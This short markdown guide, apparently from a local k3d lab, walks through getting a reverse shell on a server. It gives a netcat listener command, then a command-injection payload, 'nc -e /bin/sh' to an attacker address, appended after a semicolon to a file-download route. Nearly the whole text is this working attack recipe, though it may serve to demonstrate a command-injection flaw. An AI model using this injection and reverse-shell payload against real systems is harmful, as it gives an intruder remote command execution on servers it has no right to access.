# Reverse Shell

1 - On you host run the following command in a terminal
```bash
nc -lvp 4242
```

2 - Pass a reverse shell command after a semicolon in the `GET /file/:filename` route, to execute these commands on the server:


```bash
nc -e /bin/sh 172.17.0.1 4242
# 172.17.0.1 being my IP address with k3d
```

3 - And tadaaa ðŸŽ‰! You have a Reverse Shell on you host!
